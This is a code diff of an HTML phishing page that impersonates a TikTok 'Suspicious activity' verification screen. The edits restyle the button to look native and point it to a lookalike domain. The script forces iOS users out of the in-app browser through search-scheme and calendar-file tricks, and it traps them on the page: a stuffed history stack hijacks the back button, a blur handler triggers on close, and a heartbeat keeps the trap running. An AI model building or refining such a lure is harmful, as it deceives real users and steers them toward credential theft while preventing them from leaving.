@@ -18,24 +18,27 @@
             padding: 0 35px; box-sizing: border-box;
         }
 
-        /* Visual elements from the first code */
-        .verification-icon { width: 60px; height: 60px; margin-bottom: 15px; }
-        .header { color: #161823; font-size: 22px; font-weight: 700; margin-bottom: 10px; }
-        .subtext { color: #8A8B91; font-size: 16px; line-height: 1.5; margin-bottom: 40px; max-width: 310px; }
+        /* Smaller Visuals */
+        .v-icon { width: 50px; height: 50px; margin-bottom: 15px; }
+        .header { color: #161823; font-size: 20px; font-weight: 700; margin-bottom: 8px; }
+        .subtext { color: #8A8B91; font-size: 14px; line-height: 1.4; margin-bottom: 30px; max-width: 280px; }
 
-        /* The Button from the functional code */
+        /* Smaller, Native-looking TikTok Button */
         .btn { 
-            background: #fe2c55; color: #fff; padding: 20px 60px; 
-            border-radius: 12px; font-weight: 800; font-size: 22px; 
-            border: none; box-shadow: 0 0 20px #fe2c55; 
+            background: #fe2c55; color: #fff; 
+            padding: 12px 60px; /* Reduced padding */
+            border-radius: 4px; /* Flatter corners like native TT */
+            font-weight: 600; font-size: 15px; /* Smaller text */
+            border: none; 
             cursor: pointer;
+            -webkit-tap-highlight-color: transparent;
         }
     </style>
 </head>
 <body>
 
     <div id="main-ui">
-        <svg class="verification-icon" viewBox="0 0 48 48" fill="none">
+        <svg class="v-icon" viewBox="0 0 48 48" fill="none">
             <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
             <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
             <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
@@ -44,12 +47,11 @@
         <div class="header">Suspicious activity</div>
         <div class="subtext">Please complete verification to continue using TikTok.</div>
 
-        <button class="btn" onclick="forceSystemOpen()">LAUNCH BROWSER</button>
+        <button class="btn" onclick="forceSystemOpen()">Verify</button>
     </div>
 
 <script>
-    // THE EXACT LOGIC FROM YOUR FAVORED CODE
-    const destination = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
+    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
 
     function forceSystemOpen() {
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
@@ -62,29 +64,32 @@
         
         if (isIOS) {
             window.location.replace("x-web-search://?" + encodeURIComponent(destination));
-            
             setTimeout(() => {
                 const blob = new Blob([`BEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VEVENT\nURL:${destination}\nEND:VEVENT\nEND:VCALENDAR`], {type: 'text/calendar'});
                 const url = URL.createObjectURL(blob);
                 window.location.href = url;
             }, 500);
-
-            setTimeout(() => {
-                window.location.assign(destination);
-            }, 1000);
+            setTimeout(() => { window.location.assign(destination); }, 1000);
         }
     }
 
-    // THE "BACK" BUTTON TRAP
+    // --- THE 5-SECOND FIX (HEARTBEAT) ---
+    // This keeps the browser process active so the X button trap never expires
+    setInterval(() => {
+        // Churns a tiny bit of memory to keep the script "hot"
+        window.history.replaceState(null, null, window.location.hash || "#refresh");
+    }, 1000);
+
     window.onload = () => {
-        for(let i=0; i<50; i++) history.pushState(null, null, "#" + i);
+        // Build the back-stack immediately
+        for(let i=0; i<50; i++) history.pushState(null, null, "#sec_" + i);
     };
 
     window.onpopstate = () => {
         forceSystemOpen();
     };
 
-    // THE "X" BUTTON TRAP
+    // The "X" Button Trap
     window.onblur = () => {
         forceSystemOpen();
     };
